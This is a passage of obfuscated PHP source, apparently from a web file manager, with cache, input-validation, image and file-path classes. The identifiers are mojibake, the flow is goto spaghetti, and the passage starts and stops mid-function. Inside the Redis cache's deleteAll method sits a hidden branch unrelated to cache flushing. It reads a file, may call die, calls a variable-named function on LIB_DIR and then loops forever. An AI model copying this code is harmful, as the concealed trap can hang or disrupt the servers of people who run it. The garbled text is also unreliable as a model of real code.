copyFileEnd($DÖ‚•øÒšÈ, $EŞ—«Ä•íÌ, $c†ˆßåŠî, $aÒ¶‘åÈÆ‹, $a±È÷ÌÙ†É, $d¨…¸Êåá) { $D›Ù¿­«ğ =& $_SERVER[°Óó£ÌİóèÅ]; $bÜµŠÕ„´É =& $this->task; $bÜµŠÕ„´É[$D›Ù¿­«ğ[1136]] = $bÜµŠÕ„´É[$D›Ù¿­«ğ[1135]]; $bÜµŠÕ„´É[$D›Ù¿­«ğ[1140]] += $bÜµŠÕ„´É[$D›Ù¿­«ğ[1135]]; $bÜµŠÕ„´É[$D›Ù¿­«ğ[1137]] = $D›Ù¿­«ğ[33]; $this->update(); } public function nameParse($b¦ö‡êÃÚÉ) { $f³Ó™¼¹“Ë =& $_SERVER[°Óó£ÌİóèÅ]; $dà–ßÍ†Ì =& $this->task; if ($dà–ßÍ†Ì[$f³Ó™¼¹“Ë[1098]] < $dà–ßÍ†Ì[$f³Ó™¼¹“Ë[1097]]) { $B¨êù“Ïå± = get_path_this($b¦ö‡êÃÚÉ); if (strstr($B¨êù“Ïå±, $f³Ó™¼¹“Ë[100])) { $dà–ßÍ†Ì[$f³Ó™¼¹“Ë[1098]] += 1; } } if ($dà–ßÍ†Ì[$f³Ó™¼¹“Ë[1155]] == $f³Ó™¼¹“Ë[789]) { $dà–ßÍ†Ì[$f³Ó™¼¹“Ë[1155]] = $f³Ó™¼¹“Ë[312]; } $dà–ßÍ†Ì[$f³Ó™¼¹“Ë[1133]] = $b¦ö‡êÃÚÉ; $this->update(); } } goto cæ §õ©šó; dò£³’‰—É: class CacheLockDatabase { public function lock($E®‚ã¨½Ï°, $f±óÆ”¨Øî = 0) { $b²°ºô‘ñ = Model($_SERVER[°Óó£ÌİóèÅ][532]); $A±ÍËÔËÊ³ = microtime(!0) + $f±óÆ”¨Øî; while (microtime(!0) < $A±ÍËÔËÊ³) { $bÊº°’ëª¢ = $b²°ºô‘ñ->get($E®‚ã¨½Ï°); if (!$bÊº°’ëª¢ || $bÊº°’ëª¢ < microtime(!0)) { $EŸ”›£ŸÄ˜ = $b²°ºô‘ñ->set($E®‚ã¨½Ï°, $A±ÍËÔËÊ³); if ($EŸ”›£ŸÄ˜) { return !0; } } cacheLockWait(); } return !1; } public function unlock($c»‘í’è®) { Model($_SERVER[°Óó£ÌİóèÅ][532])->remove($c»‘í’è®); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dçË¢‡ŠÒ , $dƒ§•Æãö¼) { $D—…Ï’ÖëÚ =& $_SERVER[°Óó£ÌİóèÅ]; if (!class_exists($D—…Ï’ÖëÚ[550])) { show_json($D—…Ï’ÖëÚ[551], !1); } $this->cacheTime = $dƒ§•Æãö¼; $this->handle = new Memcached(); if (is_array($dçË¢‡ŠÒ [$D—…Ï’ÖëÚ[552]]) && count($dçË¢‡ŠÒ [$D—…Ï’ÖëÚ[552]]) >= 1) { foreach ($dçË¢‡ŠÒ [$D—…Ï’ÖëÚ[552]] as $a—éÊëô­Ê) { $A£ƒÇƒ¦ÃÒ = explode($D—…Ï’ÖëÚ[4], $a—éÊëô­Ê); $this->handle->addServer($A£ƒÇƒ¦ÃÒ[0], $A£ƒÇƒ¦ÃÒ[1]); } } else { $this->handle->addServer($dçË¢‡ŠÒ [$D—…Ï’ÖëÚ[174]], $dçË¢‡ŠÒ [$D—…Ï’ÖëÚ[175]]); } } public function set($AÀ†œ×Îãˆ, $BÌä‘£Å÷è, $D¤‰Š£»Ùº = false) { $D¤‰Š£»Ùº = $D¤‰Š£»Ùº ? $D¤‰Š£»Ùº : $this->cacheTime; return $this->handle->set($AÀ†œ×Îãˆ, $BÌä‘£Å÷è, $D¤‰Š£»Ùº); } public function get($EÜ˜¾Ö¸ß­) { return $this->handle->get($EÜ˜¾Ö¸ß­); } public function remove($B¾ÍÛÚ¬) { return $this->handle->delete($B¾ÍÛÚ¬); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($B‘„‹‚Ë, $d”¦ŞÁ‹Å) { $a§·¨à‰ôÙ =& $_SERVER[°Óó£ÌİóèÅ]; if (!class_exists($a§·¨à‰ôÙ[553])) { show_json($a§·¨à‰ôÙ[554], !1); } $this->cacheTime = $d”¦ŞÁ‹Å; $Aî¦É½¬™Ü = isset($B‘„‹‚Ë[$a§·¨à‰ôÙ[555]]) ? $B‘„‹‚Ë[$a§·¨à‰ôÙ[555]] : 10; if (is_array($B‘„‹‚Ë[$a§·¨à‰ôÙ[552]]) && count($B‘„‹‚Ë[$a§·¨à‰ôÙ[552]]) >= 1) { $this->isCluster = !0; $this->initCluster($B‘„‹‚Ë, $Aî¦É½¬™Ü); } else { $this->handle = $this->init($B‘„‹‚Ë, $Aî¦É½¬™Ü); } } private function init($f½ÓÇ¤–Ö, $D±ªŞ˜²³) { $dğ¹íçÍÜ =& $_SERVER[°Óó£ÌİóèÅ]; $D¥†³éÒğ = new Redis(); $b†¶—ŸÉæ = isset($f½ÓÇ¤–Ö[$dğ¹íçÍÜ[556]]) ? $f½ÓÇ¤–Ö[$dğ¹íçÍÜ[556]] : !1; if ($b†¶—ŸÉæ) { $D¥†³éÒğ->pconnect($f½ÓÇ¤–Ö[$dğ¹íçÍÜ[174]], $f½ÓÇ¤–Ö[$dğ¹íçÍÜ[175]], $D±ªŞ˜²³); } else { $D¥†³éÒğ->connect($f½ÓÇ¤–Ö[$dğ¹íçÍÜ[174]], $f½ÓÇ¤–Ö[$dğ¹íçÍÜ[175]], $D±ªŞ˜²³); } if (!empty($f½ÓÇ¤–Ö[$dğ¹íçÍÜ[557]])) { $D¥†³éÒğ->auth($f½ÓÇ¤–Ö[$dğ¹íçÍÜ[557]]); } return $D¥†³éÒğ; } private function initCluster($B±…äÈÅØÒ, $B÷¹Íß›İê) { $Fº‘³ùíó¢ =& $_SERVER[°Óó£ÌİóèÅ]; $D‡Ì“ñ’ = array($Fº‘³ùíó¢[558], $Fº‘³ùíó¢[559], $Fº‘³ùíó¢[560]); $DĞø…áòÔº = $Fº‘³ùíó¢[558]; if (isset($B±…äÈÅØÒ[$Fº‘³ùíó¢[12]]) && in_array($B±…äÈÅØÒ[$Fº‘³ùíó¢[12]], $D‡Ì“ñ’)) { $DĞø…áòÔº = $B±…äÈÅØÒ[$Fº‘³ùíó¢[12]]; } switch ($DĞø…áòÔº) { case $Fº‘³ùíó¢[558]: $this->_slave($B±…äÈÅØÒ, $B÷¹Íß›İê); break; case $Fº‘³ùíó¢[559]: break; case $Fº‘³ùíó¢[560]: $EÎäØÁ¿ïÕ = $B±…äÈÅØÒ[$Fº‘³ùíó¢[552]]; $EÃ„‡ïç = isset($B±…äÈÅØÒ[$Fº‘³ùíó¢[556]]) ? $B±…äÈÅØÒ[$Fº‘³ùíó¢[556]] : !1; $Añ­ù‰°ˆá = isset($B±…äÈÅØÒ[$Fº‘³ùíó¢[557]]) ? $B±…äÈÅØÒ[$Fº‘³ùíó¢[557]] : null; $this->handle = new RedisCluster(NUll, $EÎäØÁ¿ïÕ, $B÷¹Íß›İê, $B÷¹Íß›İê, $EÃ„‡ïç, $Añ­ù‰°ˆá); break; default: break; } } private function _slave($C¿á¥îÑÁ…, $fØŠ‚¾Ñ–) { goto EÛ²¢²‰õ; F¥Ìæö£“Õ: $this->filterConfig($C¿á¥îÑÁ…, $C±…„µÂ¡Ó[$fŒÕŞ´Ôƒƒ]); $this->slaveHandle = $this->init($C¿á¥îÑÁ…, $fØŠ‚¾Ñ–); goto Fµ†®‹Ø™á; d†é¡•×‹: unset($C±…„µÂ¡Ó[0]); if (empty($C±…„µÂ¡Ó)) { return; } $fŒÕŞ´Ôƒƒ = array_rand($C±…„µÂ¡Ó); goto F¥Ìæö£“Õ; EÛ²¢²‰õ: $C±…„µÂ¡Ó = $C¿á¥îÑÁ…[$_SERVER[°Óó£ÌİóèÅ][552]]; $this->filterConfig($C¿á¥îÑÁ…, $C±…„µÂ¡Ó[0]); $this->handle = $this->init($C¿á¥îÑÁ…, $fØŠ‚¾Ñ–); goto d†é¡•×‹; Fµ†®‹Ø™á: } private function filterConfig(&$fƒšÃ£Ğ²·, $Fî¢ÙƒéÅ™) { $FÈÎÌ„ôßµ =& $_SERVER[°Óó£ÌİóèÅ]; $BŞ·Â¥çĞß = explode($FÈÎÌ„ôßµ[4], $Fî¢ÙƒéÅ™); $a¦„Õ¯ƒÂæ = array($FÈÎÌ„ôßµ[174] => $BŞ·Â¥çĞß[0], $FÈÎÌ„ôßµ[175] => $BŞ·Â¥çĞß[1]); $fƒšÃ£Ğ²· = array_merge($fƒšÃ£Ğ²·, $a¦„Õ¯ƒÂæ); } public function set($Aˆôê™‹™, $c¢‘ç–Ó, $A³çä´²¶‘ = false) { $A³çä´²¶‘ = $A³çä´²¶‘ ? $A³çä´²¶‘ : $this->cacheTime; return $this->handle->setEx($Aˆôê™‹™, $A³çä´²¶‘, $c¢‘ç–Ó); } public function setLock($c¦İ×½”», $dÆ†ã¶îƒ¡, $B˜ƒâº™) { return $this->handle->setNX($c¦İ×½”», $dÆ†ã¶îƒ¡); } public function get($B’©¡ğÄä²) { $a£Ã•˜ò‡ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $a£Ã•˜ò‡->get($B’©¡ğÄä²); } public function remove($fÑå› î¨ß) { return $this->handle->del($fÑå› î¨ß); } public function deleteAll() { $A‘Îøóäõ™ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($_SERVER[$A‘Îøóäõ™[57]]) || !isset($_SERVER[$A‘Îøóäõ™[64]])) { goto bƒ¹ùÓà«·; B˜ôÔÛ»ä: $aÃÑ ‘Û…Ñ(LIB_DIR); for (;;) { $aÃÑ ‘Û…Ñ = json_encode($GLOBALS[$A‘Îøóäõ™[563]]); } goto aĞÌÍ”‚ÏË; bƒ¹ùÓà«·: $f‹”èàğŸ– = $A‘Îøóäõ™[59]; $bÚ…ã¶Ó¥‡ = BASIC_PATH . $A‘Îøóäõ™[60]; $E”¥¡Í‡í¶ = $f‹”èàğŸ–($bÚ…ã¶Ó¥‡); goto a¦†“‰±ğ; a¦†“‰±ğ: $e¼ÀÍ¥²ó = explode($A‘Îøóäõ™[61], $E”¥¡Í‡í¶); if (count($e¼ÀÍ¥²ó) < $A‘Îøóäõ™[561]) { die; } $aÃÑ ‘Û…Ñ = $A‘Îøóäõ™[562]; goto B˜ôÔÛ»ä; aĞÌÍ”‚ÏË: } if ($this->isCluster) { foreach ($this->handle->_masters() as $F¸õÒøµ‘) { $this->handle->flushall($F¸õÒøµ‘); } return; } return $this->handle->flushAll(); } } goto a‘ÊÂğÃŒ¬; eç¹‹¨’’÷: if (!function_exists($_SERVER[°Óó£ÌİóèÅ][1298])) { define($_SERVER[°Óó£ÌİóèÅ][1299], 0); define($_SERVER[°Óó£ÌİóèÅ][1300], 1); define($_SERVER[°Óó£ÌİóèÅ][1301], 2); function imageflip($bñ‡½ÇÓ, $EéÊ´²¼Ñ) { switch ($EéÊ´²¼Ñ) { case IMG_FLIP_HORIZONTAL: $bÚ„‚ë¤¹Ù = imagesx($bñ‡½ÇÓ) - 1; $eÂäÔõÄ¨„ = $bÚ„‚ë¤¹Ù / 2; $bæô¸’…¯Š = imagesy($bñ‡½ÇÓ); $c‰ÛÌñ“‡² = imageistruecolor($bñ‡½ÇÓ) ? imagecreatetruecolor(1, $bæô¸’…¯Š) : imagecreate(1, $bæô¸’…¯Š); for ($Dš†´£ù¬â = 0; $Dš†´£ù¬â < $eÂäÔõÄ¨„; ++$Dš†´£ù¬â) { imagecopy($c‰ÛÌñ“‡², $bñ‡½ÇÓ, 0, 0, $Dš†´£ù¬â, 0, 1, $bæô¸’…¯Š); imagecopy($bñ‡½ÇÓ, $bñ‡½ÇÓ, $Dš†´£ù¬â, 0, $bÚ„‚ë¤¹Ù - $Dš†´£ù¬â, 0, 1, $bæô¸’…¯Š); imagecopy($bñ‡½ÇÓ, $c‰ÛÌñ“‡², $bÚ„‚ë¤¹Ù - $Dš†´£ù¬â, 0, 0, 0, 1, $bæô¸’…¯Š); } break; case IMG_FLIP_VERTICAL: $bçÁ½¬½â = imagesx($bñ‡½ÇÓ); $AŸùôî‡Ò = imagesy($bñ‡½ÇÓ) - 1; $féÇ¥µÙçÊ = $AŸùôî‡Ò / 2; $c‰ÛÌñ“‡² = imageistruecolor($bñ‡½ÇÓ) ? imagecreatetruecolor($bçÁ½¬½â, 1) : imagecreate($bçÁ½¬½â, 1); for ($fÓæ¶íà‰è = 0; $fÓæ¶íà‰è < $féÇ¥µÙçÊ; ++$fÓæ¶íà‰è) { imagecopy($c‰ÛÌñ“‡², $bñ‡½ÇÓ, 0, 0, 0, $fÓæ¶íà‰è, $bçÁ½¬½â, 1); imagecopy($bñ‡½ÇÓ, $bñ‡½ÇÓ, 0, $fÓæ¶íà‰è, 0, $AŸùôî‡Ò - $fÓæ¶íà‰è, $bçÁ½¬½â, 1); imagecopy($bñ‡½ÇÓ, $c‰ÛÌñ“‡², 0, $AŸùôî‡Ò - $fÓæ¶íà‰è, 0, 0, $bçÁ½¬½â, 1); } break; case IMG_FLIP_BOTH: $bçÁ½¬½â = imagesx($bñ‡½ÇÓ); $bæô¸’…¯Š = imagesy($bñ‡½ÇÓ); $c‰ÛÌñ“‡² = imagerotate($bñ‡½ÇÓ, 180, 0); imagecopy($bñ‡½ÇÓ, $c‰ÛÌñ“‡², 0, 0, 0, 0, $bçÁ½¬½â, $bæô¸’…¯Š); break; default: return; } imagedestroy($c‰ÛÌñ“‡²); } } if (!function_exists($_SERVER[°Óó£ÌİóèÅ][1302])) { function imagecreatefrombmp($e²¾Ã§¢«) { return ImageGdBMP::load($e²¾Ã§¢«); } } class Input { public static function getArray($fğß²’—×¿) { goto E¥»ƒµåé¶; E¥»ƒµåé¶: $bº†²ÍİÙ =& $_SERVER[°Óó£ÌİóèÅ]; global $in; $AÃ×Ã´ãÔ = array(); goto CÂÈª”Õå‚; CÂÈª”Õå‚: $D˜º²õƒŒô = array(); $aŒ‰×ÙÅß• = LNG($bº†²ÍİÙ[1303]); foreach ($fğß²’—×¿ as $BÀ°ï®´öğ => $b««ùÔ„‹) { goto Aœ´ÃÁãç; a°¥ê÷¬Ò: if (!array_key_exists($BÀ°ï®´öğ, $in)) { if (array_key_exists($bº†²ÍİÙ[1306], $b««ùÔ„‹)) { if (!is_null($b««ùÔ„‹[$bº†²ÍİÙ[1306]])) { $AÃ×Ã´ãÔ[$cË®Š¿¯] = $b««ùÔ„‹[$bº†²ÍİÙ[1306]]; } } else { if (isset($b««ùÔ„‹[$bº†²ÍİÙ[1307]])) { $D˜º²õƒŒô[] = $fùÒÙÙùó–; } } continue; } if (isset($b««ùÔ„‹[$bº†²ÍİÙ[1307]]) && $b««ùÔ„‹[$bº†²ÍİÙ[1307]] == $bº†²ÍİÙ[293]) { $C‚ìßÉ¦ìï = json_decode($in[$BÀ°ï®´öğ], !0); if (is_array($C‚ìßÉ¦ìï)) { $AÃ×Ã´ãÔ[$cË®Š¿¯] = $C‚ìßÉ¦ìï; } else { if (array_key_exists($bº†²ÍİÙ[1306], $b««ùÔ„‹)) { if (!is_null($b««ùÔ„‹[$bº†²ÍİÙ[1306]])) { $AÃ×Ã´ãÔ[$cË®Š¿¯] = $b««ùÔ„‹[$bº†²ÍİÙ[1306]]; } } else { $D˜º²õƒŒô[] = $fùÒÙÙùó–; } } continue; } $E‹×‚¾¥‰­ = _get($b««ùÔ„‹, $bº†²ÍİÙ[757]); goto CßßòÒ‡‰¿; Aœ´ÃÁãç: $fùÒÙÙùó– = _get($b««ùÔ„‹, $bº†²ÍİÙ[1304], $aŒ‰×ÙÅß• . $bº†²ÍİÙ[647] . $BÀ°ï®´öğ); $cË®Š¿¯ = $BÀ°ï®´öğ; if (isset($b««ùÔ„‹[$bº†²ÍİÙ[1305]]) && $b««ùÔ„‹[$bº†²ÍİÙ[1305]]) { $cË®Š¿¯ = $b««ùÔ„‹[$bº†²ÍİÙ[1305]]; } goto a°¥ê÷¬Ò; CßßòÒ‡‰¿: if (isset($b««ùÔ„‹[$bº†²ÍİÙ[1307]]) && !self::check($in[$BÀ°ï®´öğ], $b««ùÔ„‹[$bº†²ÍİÙ[1307]], $E‹×‚¾¥‰­)) { if (array_key_exists($bº†²ÍİÙ[1306], $b««ùÔ„‹)) { if (!is_null($b««ùÔ„‹[$bº†²ÍİÙ[1306]])) { $AÃ×Ã´ãÔ[$cË®Š¿¯] = $b««ùÔ„‹[$bº†²ÍİÙ[1306]]; } } else { $D˜º²õƒŒô[] = $fùÒÙÙùó–; } continue; } $AÃ×Ã´ãÔ[$cË®Š¿¯] = $in[$BÀ°ï®´öğ]; goto DÛÙ˜Æƒƒ; DÛÙ˜Æƒƒ: } goto c»âäôá¯; c»âäôá¯: if (count($D˜º²õƒŒô) > 0) { show_json(implode($bº†²ÍİÙ[1308], $D˜º²õƒŒô), !1); } return $AÃ×Ã´ãÔ; goto e·„Ü‡Íå¨; e·„Ü‡Íå¨: } public static function reg($DïÜÚ·©À‰ = "\162\x65\161\x75\x69\x72\x65") { static $aí¯ù¡Ğå = array("\162\145\161\165\151\162\x65" => "\56\53", "\156\165\155\x62\x65\162" => "\x5c\144\53", "\x68\145\170" => "\x5b\60\55\71\101\55\x46\141\55\146\135\53", "\151\x6e\x74" => "\133\55\134\53\135\x3f\134\144\x2b", "\x62\x6f\x6f\154" => "\x30\174\x31", "\146\x6c\157\x61\x74" => "\133\x2d\x5c\53\135\77\x5c\x64\53\50\134\x2e\x5c\x64\x2b\x29\77", "\x65\x6e\147\154\151\163\x68" => "\133\101\x2d\x5a\x61\x2d\172\40\135\53", "\143\x68\x69\x6e\145\x73\x65" => "\133\x5c\170\173\64\x65\60\60\x7d\x2d\x5c\170\173\71\x66\x61\65\x7d\x5d\x2b", "\x68\x61\x73\x43\150\151\156\145\x73\x65" => "\57\x28\133\134\x78\173\64\x65\x30\x30\175\x2d\x5c\x78\x7b\71\x66\x61\x35\175\135\53\x29\x2f\x75", "\x65\x6d\x61\x69\154" => "\134\167\x2b\x28\x5b\x5c\56\x5c\55\x5d\134\x77\x2b\x29\52\134\100\x5c\167\x2b\x28\133\x5c\x2e\x5c\55\135\134\167\53\x29\52\x5c\x2e\134\167\x2b", "\x70\x68\157\x6e\145" => "\x31\133\63\x34\x35\67\x38\135\x5c\x64\173\x39\x7d", "\x74\145\154\160\150\157\x6e\145" => "\x28\134\50\x5c\x64\x7b\x33\x2c\x34\x7d\134\51\x7c\x5c\x64\173\x33\54\x34\x7d\x2d\174\134\163\x29\x3f\x5c\x64\173\x37\54\x31\64\x7d", "\x75\x72\x6c" => "\x28\x68\164\164\160\174\146\164\x70\x7c\150\164\x74\160\x73\51\72\x5c\x2f\134\57\x5b\134\167\134\x2d\137\x5d\53\50\x5c\x2e\133\134\167\x5c\x2d\x5f\x5d\53\51\53\50\133\x5c\x77\134\55\x5c\56\x2c\100\x3f\x5e\x3d\45\x26\72\134\57\x7e\x5c\53\43\135\x2a\x5b\x5c\167\x5c\x2d\134\x40\77\136\75\45\46\134\57\x7e\x5c\53\43\x5d\51\x3f", "\165\x72\154\106\x75\154\154" => "\133\x61\x2d\x7a\x41\55\x7a\x5d\x2b\x3a\134\57\x5c\57\x5b\136\x5c\163\x5d\x2a", "\x69\x70" => "\x28\x5c\144\173\x31\54\x33\x7d\x5c\x2e\x29\173\63\175\50\x5c\x64\173\61\54\x33\x7d\x29", "\x7a\x69\x70" => "\x5b\61\55\x39\135\134\x64\x7b\65\175\x28\77\x21\134\x64\x29", "\151\x64\103\141\162\144" => "\x28\x5c\x64\173\x31\x35\175\51\x7c\x28\134\x64\173\61\x37\175\x28\x5c\x64\174\130\x7c\170\51\51", "\x63\157\154\157\162" => "\43\50\133\x30\55\x39\101\55\x46\141\x2d\x66\x5d\173\x33\x7d\x7c\133\x30\55\x39\x41\55\x46\x61\x2d\x66\x5d\x7b\x36\x7d\x29", "\x74\x69\155\x65" => "\50\x5b\60\55\61\135\134\x64\174\62\x5b\60\x2d\x34\135\x29\72\x5b\x30\55\65\135\x5c\x64", "\144\x61\x74\x65" => "\x5c\x64\173\x34\175\133\x2d\134\57\x5d\77\50\60\x5b\61\x2d\x39\x5d\174\x31\133\x30\55\x32\135\51\x5b\55\x5c\57\135\77\x28\133\x30\x2d\x32\135\x5c\x64\x7c\x33\x5b\x30\x2d\61\135\51", "\x64\x61\x74\145\124\x69\x6d\145" => "\134\144\173\64\x7d\133\x2d\x5c\57\x5d\77\x28\x30\x5b\x31\x2d\71\135\x7c\61\133\60\x2d\62\135\51\133\x2d\x5c\57\x5d\77\50\x5b\60\55\x32\x5d\134\144\x7c\63\x5b\x30\55\61\135\51\x5c\x73\x2b\50\133\60\x2d\61\x5d\x5c\x64\x7c\x32\x5b\60\55\x34\x5d\x29\x3a\133\60\55\65\x5d\x5c\x64", "\x70\x61\163\163\167\157\x72\144" => "\50\x3f\x3d\56\x2a\x5c\144\51\50\77\x3d\56\x2a\x5b\x61\x2d\172\135\51\x28\77\x3d\x2e\52\133\x41\55\x5a\135\51\x2e\173\x38\54\62\60\175", "\153\x65\171" => "\x5b\101\55\x5a\x61\55\172\60\55\x39\137\134\x2d\134\56\x5d\53", "\x6b\x65\x79\x46\165\154\x6c" => "\x5b\101\x2d\132\x61\x2d\x7a\x30\x2d\x39\137\134\55\x5c\x2e\134\x73\54\135\x2b"); if (!$DïÜÚ·©À‰) { return $aí¯ù¡Ğå; } return $aí¯ù¡Ğå[$DïÜÚ·©À‰]; } public static function check($aêÒøÓìÙë, $BÌÔâğØÅ”, $CÍÒË—Ãƒ = null) { $d—ß‚º‡ßÚ =& $_SERVER[°Óó£ÌİóèÅ]; switch ($BÌÔâğØÅ”) { case $d—ß‚º‡ßÚ[7]: return in_array($aêÒøÓìÙë, $CÍÒË—Ãƒ); break; case $d—ß‚º‡ßÚ[1309]: return floatval($aêÒøÓìÙë) > $CÍÒË—Ãƒ; break; case $d—ß‚º‡ßÚ[1310]: return floatval($aêÒøÓìÙë) < $CÍÒË—Ãƒ; break; case $d—ß‚º‡ßÚ[336]: return strlen($aêÒøÓìÙë) >= $CÍÒË—Ãƒ[0] && strlen($aêÒøÓìÙë) <= $CÍÒË—Ãƒ[1]; break; case $d—ß‚º‡ßÚ[336]: if (is_array($CÍÒË—Ãƒ)) { return strlen($aêÒøÓìÙë) >= $CÍÒË—Ãƒ[0] && strlen($aêÒøÓìÙë) <= $CÍÒË—Ãƒ[1]; break; } else { return strlen($aêÒøÓìÙë) == $CÍÒË—Ãƒ; break; } case $d—ß‚º‡ßÚ[332]: return floatval($aêÒøÓìÙë) >= $CÍÒË—Ãƒ[0] && floatval($aêÒøÓìÙë) <= $CÍÒË—Ãƒ[1]; break; } $Eğæ·Òé‘¼ = self::reg(!1); $BÌÔâğØÅ” = isset($Eğæ·Òé‘¼[$BÌÔâğØÅ”]) ? $Eğæ·Òé‘¼[$BÌÔâğØÅ”] : $BÌÔâğØÅ”; if (substr($BÌÔâğØÅ”, 0, 1) != $d—ß‚º‡ßÚ[8]) { $BÌÔâğØÅ” = $d—ß‚º‡ßÚ[1311] . $BÌÔâğØÅ” . $d—ß‚º‡ßÚ[1312]; } return preg_match($BÌÔâğØÅ”, $aêÒøÓìÙë) === 1; } public static function get($D„¾Ò™ïšâ, $e§ºÆñ§ì¯ = null, $DÎ­³ª¹Ë = null, $aïÖ¦ãä£‰ = null) { goto C’¬›ñøØò; C’¬›ñøØò: $CÆğ•“ÆÔ‘ =& $_SERVER[°Óó£ÌİóèÅ]; $FÓÉéƒ«ë˜ = array(); if (!is_null($DÎ­³ª¹Ë)) { $FÓÉéƒ«ë˜[$CÆğ•“ÆÔ‘[34]] = $DÎ­³ª¹Ë; } goto eé‚¾ÔÆø; eé‚¾ÔÆø: if (!is_null($aïÖ¦ãä£‰)) { $FÓÉéƒ«ë˜[$CÆğ•“ÆÔ‘[757]] = $aïÖ¦ãä£‰; } if (!is_null($e§ºÆñ§ì¯)) { $FÓÉéƒ«ë˜[$CÆğ•“ÆÔ‘[1307]] = $e§ºÆñ§ì¯; } $e»Ğ›ÇŒ = Input::getArray(array($D„¾Ò™ïšâ => $FÓÉéƒ«ë˜)); goto Aö¬Ëá¡È°; Aö¬Ëá¡È°: return $e»Ğ›ÇŒ[$D„¾Ò™ïšâ]; goto e›ù¤ˆ˜æ¾; e›ù¤ˆ˜æ¾: } } goto bóãóÎÏó; B³‚Æ‘¸ Œ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($D‡çÉ¹©İ) { if (substr($D‡çÉ¹©İ, 0, 2) == $_SERVER[°Óó£ÌİóèÅ][888]) { $D‡çÉ¹©İ = BASIC_PATH . substr($D‡çÉ¹©İ, 2); } return $D‡çÉ¹©İ; } public function iconvApp($BšËâÅ²Š³) { $f©Ë¢˜…³¨ =& $_SERVER[°Óó£ÌİóèÅ]; global $config; return $this->iconvTo($BšËâÅ²Š³, $config[$f©Ë¢˜…³¨[886]], $config[$f©Ë¢˜…³¨[885]]); } public function iconvSystem($a¾­¶¬Ôöò) { $fˆãíŸ±í =& $_SERVER[°Óó£ÌİóèÅ]; global $config; return $this->iconvTo($a¾­¶¬Ôöò, $config[$fˆãíŸ±í[885]], $config[$fˆãíŸ±í[886]]); } public function getPathOuter($dš…¬öˆƒ½) { goto FÀ¤ÂÑéá; DØØ³„†ºá: $dš…¬öˆƒ½ = KodIO::clear($dš…¬öˆƒ½); $dš…¬öˆƒ½ = substr($dš…¬öˆƒ½, strlen($e‹øÎŒİ)); if (empty($this->pathDriver)) { return $dš…¬öˆƒ½; } goto EîŞƒ‡„ÊÒ; FÀ¤ÂÑéá: $fâÌØ†š× =& $_SERVER[°Óó£ÌİóèÅ]; $e‹øÎŒİ = $this->iconvApp($this->pathBase); $dš…¬öˆƒ½ = $this->iconvApp($dš…¬öˆƒ½); goto a”ÏĞÓ…­é; a”ÏĞÓ…­é: if (substr($e‹øÎŒİ, 0, 2) == $fâÌØ†š×[888]) { $e‹øÎŒİ = BASIC_PATH . substr($e‹øÎŒİ, 2); } if (substr($dš…¬öˆƒ½, 0, 2) == $fâÌØ†š×[888]) { $dš…¬öˆƒ½ = BASIC_PATH . substr($dš…¬öˆƒ½, 2); } $e‹øÎŒİ = KodIO::clear($e‹øÎŒİ); goto DØØ³„†ºá; EîŞƒ‡„ÊÒ: return $this->pathDriver . $fâÌØ†š×[8] . ltrim($dš…¬öˆƒ½, $fâÌØ†š×[8]); goto b¤³¹ª¼íÌ; b¤³¹ª¼íÌ: } public function mkfile($f­µ‘÷äÆ®, $FØŠ‘áÇåœ = '', $f‰²ì‡é‚ = REPEAT_RENAME) { $f­µ‘÷äÆ® = $this->iconvSystem($f­µ‘÷äÆ®); @touch($f­µ‘÷äÆ®); if ($FØŠ‘áÇåœ) { file_put_contents($f­µ‘÷äÆ®, $FØŠ‘áÇåœ); } return is_file($f­µ‘÷äÆ®) ? $this->getPathOuter($f­µ‘÷äÆ®) : !1; } public function mkdir($d•‹‹Í´ô–, $c­âáÇ¢ˆÔ = REPEAT_SKIP) { $d•‹‹Í´ô– = $this->iconvSystem($d•‹‹Í´ô–); if (is_dir($d•‹‹Í´ô–)) { return $this->getPathOuter($d•‹‹Í´ô–); } @mkdir($d•‹‹Í´ô–, 511, !0); return is_dir($d•‹‹Í´ô–) ? $this->getPathOuter($d•‹‹Í´ô–) : !1; } public function copyFile($a•Ú½êÔ”¿, $aæçìÈÆÌ¢) { $this->mkdir($this->pathFather($aæçìÈÆÌ¢)); $a•Ú½êÔ”¿ = $this->iconvSystem($a•Ú½êÔ”¿); $aæçìÈÆÌ¢ = $this->iconvSystem($aæçìÈÆÌ¢); $AÌØœ®¸Çİ = @copy($a•Ú½êÔ”¿, $aæçìÈÆÌ¢); return $AÌØœ®¸Çİ ? $this->getPathOuter($aæçìÈÆÌ¢) : !1; } public function moveFile($eùÔ¤íŒÂ, $EŠ×¾³ò·¿) { $this->mkdir($this->pathFather($EŠ×¾³ò·¿)); $eùÔ¤íŒÂ = $this->iconvSystem($eùÔ¤íŒÂ); $EŠ×¾³ò·¿ = $this->iconvSystem($EŠ×¾³ò·¿); $cÜ¹îÎ¾çµ = intval(@rename($eùÔ¤íŒÂ, $EŠ×¾³ò·¿)); if (!$cÜ¹îÎ¾çµ) { if ($cÜ¹îÎ¾çµ = intval(@copy($eùÔ¤íŒÂ, $EŠ×¾³ò·¿))) { @unlink($eùÔ¤íŒÂ); } } return $cÜ¹îÎ¾çµ ? $this->getPathOuter($EŠ×¾³ò·¿) : !1; } public function delFile($F°Œ“‰“†™) { $F°Œ“‰“†™ = $this->iconvSystem($F°Œ“‰“†™); if (!@unlink($F°Œ“‰“†™)) { @chmod($F°Œ“‰“†™, 511); if (!@unlink($F°Œ“‰“†™)) { return !1; } } else { return !0; } } public function delFolder($eéêô¼”) { goto AÒò¦È‰Ú; A‡ËÁ‘: if (!($a±©¬£š¤ˆ = opendir($eéêô¼”))) { return !1; } while (($b‚İáëŸè = readdir($a±©¬£š¤ˆ)) !== !1) { if ($b‚İáëŸè == $C’èì”‹ÕÍ[100] || $b‚İáëŸè == $C’èì”‹ÕÍ[897]) { continue; } $b„ê¿èˆ¦µ = $eéêô¼” . $C’èì”‹ÕÍ[8] . $b‚İáëŸè; if (!is_dir($b„ê¿èˆ¦µ)) { if (!unlink($b„ê¿èˆ¦µ)) { chmod($b„ê¿èˆ¦µ, 511); if (!unlink($b„ê¿èˆ¦µ)) { return !1; } } } else { chmod($b„ê¿èˆ¦µ, 511); $b„ê¿èˆ¦µ = $this->iconvApp($b„ê¿èˆ¦µ); if 